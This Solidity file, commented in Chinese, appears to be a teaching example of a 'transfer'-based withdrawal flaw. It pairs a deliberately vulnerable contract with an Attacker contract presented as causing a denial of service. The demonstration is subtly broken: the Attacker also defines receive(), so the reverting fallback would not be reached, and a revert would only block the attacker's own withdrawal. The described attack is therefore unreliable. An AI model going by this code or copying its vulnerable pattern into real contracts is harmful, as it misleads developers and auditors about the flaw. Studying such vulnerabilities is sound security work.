// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱：Improper Use of Exception Handling Functions
描述：將 Ether 轉給使用者時誤用了 transfer，該方法只轉送固定 2300 gas，若接收合約利用 fallback 消耗過多 gas 或故意 revert，將導致 withdraw 失敗。

攻擊步驟：
1. 部署 Vulnerable 合約並將足夠的 Ether 存入其中。
2. 部署 Attacker 合約，傳入 Vulnerable 合約地址（必須為 payable address）
3. 從 Attacker 合約呼叫 attack()，此動作先存入 Ether，再呼叫 withdraw 嘗試提款，但因 Attacker 的 fallback 會 revert，導致提款失敗，形成拒絕服務攻擊 (DoS)。
*/

contract Vulnerable {
    mapping(address => uint256) public balances;

    // 接收 Ether 的 fallback
    receive() external payable {}

    // 存款函式
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞：使用 transfer 只轉送固定 2300 gas，可能因接收合約 fallback 消耗超過這個 gas 而導致提款失敗
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        // 漏洞所在：轉帳只轉送 2300 gas
        payable(msg.sender).transfer(amount);
    }
}

// 攻擊合約
contract Attacker {
    Vulnerable public vulnerable;

    // 修改：建構子參數改為 address payable 以符合 Solidity >=0.8.0 的要求
    constructor(address payable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // 惡意 fallback：刻意 revert，使得 Vulnerable.withdraw 的 transfer 失敗
    fallback() external payable {
        revert("Fallback triggered revert");
    }

    // 攻擊函式：先存款再提款，提款將因 attacker fallback revert 而觸發拒絕服務攻擊
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw(1 ether);
    }

    // 允許合約接收 Ether
    receive() external payable {}
}
